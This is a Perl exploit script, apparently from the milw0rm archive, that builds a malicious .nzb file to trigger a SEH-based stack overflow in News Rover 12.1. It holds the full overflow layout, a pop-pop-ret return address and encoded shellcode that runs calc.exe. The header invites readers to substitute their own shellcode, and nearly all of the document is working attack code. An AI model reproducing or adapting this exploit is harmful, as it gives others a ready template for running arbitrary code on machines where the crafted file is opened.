#!/usr/bin/perl
# ===============================================================================================
#                News Rover 12.1 Rev 1 Remote Stack Overflow perl exploit 
#                               By Umesh Wanve (umesh_345@yahoo.com)
# ==============================================================================================          
# Credits : Originally discovered and coded in c by Marsu <MarsupilamiPowa@hotmail.fr>
#
# Reference : http://www.securityfocus.com/bid/22618
#
# Date : 24-02-2007
#
# This is converted into perl for perl lovers.
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
# You can replace shellcode with your favourite one :)
#
# 
# Buffer overflow exists in Subject parameter of the .nzb file
# By Passing more than 2022 bytes we can able to overwrite SEH handler
# So here you go.
# Buffer =    Buffer        +  Short Jmp to Hellcode (Pointer to NEXT SEH Handler) + SEH HANDLER +  NOP SLED + Shellcode
#         <-2022 Bytes ->   <---------------4 Byte------------------------------->   < 4 Byte >   + <-15 bytes->
#
# USE 0x750211a9 Universal address found on Metasploit. Thanks to them
# Just change to anything you want.
#
# This was written as a fun. Use it at your own risk.
#
# Special thanks to Marsu (bug discover and exploit coded in c by him). :)
# Also thanks to Metasploit for there great Opcode database.
#
#================================================================================================

use strict;

my($buffer)=("A" x 2022);               #buffer upto SEH structure

my($Short_jmp)="\xeb\x15\x90\x90";      #short jmp to hellcode

my($SEH_handler)="\xa9\x11\x02\x75";  #pop, pop, ret in WS2HELP.DLL in WIN 2000 SP4 
						  # Universal Address :)
						  #Change according to your need

my($nop)="\x90\x90\x90\x90\x90".
         "\x90\x90\x90\x90\x90".
	   "\x90\x90\x90\x90\x90";      #NOP sled to land into hellcode

# win32_exec - EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com 
my($hell_calc)=
"\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4".
"\xb2\x82\x70\x83\xeb\xfc\xe2\xf4\x58\x5a\xc6\x70\xa4\xb2\x09\x35".
"\x98\x39\xfe\x75\xdc\xb3\x6d\xfb\xeb\xaa\x09\x2f\x84\xb3\x69\x39".
"\x2f\x86\x09\x71\x4a\x83\x42\xe9\x08\x36\x42\x04\xa3\x73\x48\x7d".
"\xa5\x70\x69\x84\x9f\xe6\xa6\x74\xd1\x57\x09\x2f\x80\xb3\x69\x16".
"\x2f\xbe\xc9\xfb\xfb\xae\x83\x9b\x2f\xae\x09\x71\x4f\x3b\xde\x54".
"\xa0\x71\xb3\xb0\xc0\x39\xc2\x40\x21\x72\xfa\x7c\x2f\xf2\x8e\xfb".
"\xd4\xae\x2f\xfb\xcc\xba\x69\x79\x2f\x32\x32\x70\xa4\xb2\x09\x18".
"\x98\xed\xb3\x86\xc4\xe4\x0b\x88\x27\x72\xf9\x20\xcc\x42\x08\x74".
"\xfb\xda\x1a\x8e\x2e\xbc\xd5\x8f\x43\xd1\xe3\x1c\xc7\x9c\xe7\x08".
"\xc1\xb2\x82\x70";


my($file_header)="<?xml version=\"1.0\" encoding=\"iso-8859-1\" ?>\n".
			"<!DOCTYPE nzb PUBLIC \"-//newzBin//DTD NZB 1.0//EN\" \"http://www.newzbin.com/DTD/nzb/nzb-1.0.dtd\">\n".
			"<!-- NZB Generated by Umesh Wanve -->\n".
			"<nzb xmlns=\"http://www.google.com\">\n\n";

my($file_end)="</segment>\n".
"</segments>\n".
"</file>\n".
"</nzb>\n";


open(OUTPUTFILE, ">poc.nzb");                        # Crafted .NZB file 
 
print OUTPUTFILE $file_header;                       # Writing Header

print OUTPUTFILE "<file poster=\"Poster\" date=\"1170609233\"\nsubject=\"";    # Vulnerable SUBJECT parameter

print OUTPUTFILE $buffer;                           # buffer =A x 2022
print OUTPUTFILE $Short_jmp;                        #short jump \xEB\x15\x90\x90
print OUTPUTFILE $SEH_handler;                      #pop pop ret in    WS2HELP.DLL in WIN 2000 SP4
print OUTPUTFILE $nop;                              #nop sled to jump into shellcode
print OUTPUTFILE $hell_calc;                        #the hell code

print OUTPUTFILE "\">\n<groups><group>some group</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">some name";
print OUTPUTFILE $file_end;                                     # End of file


close(OUTFILE);


# ==========================================

# milw0rm.com [2007-02-24]
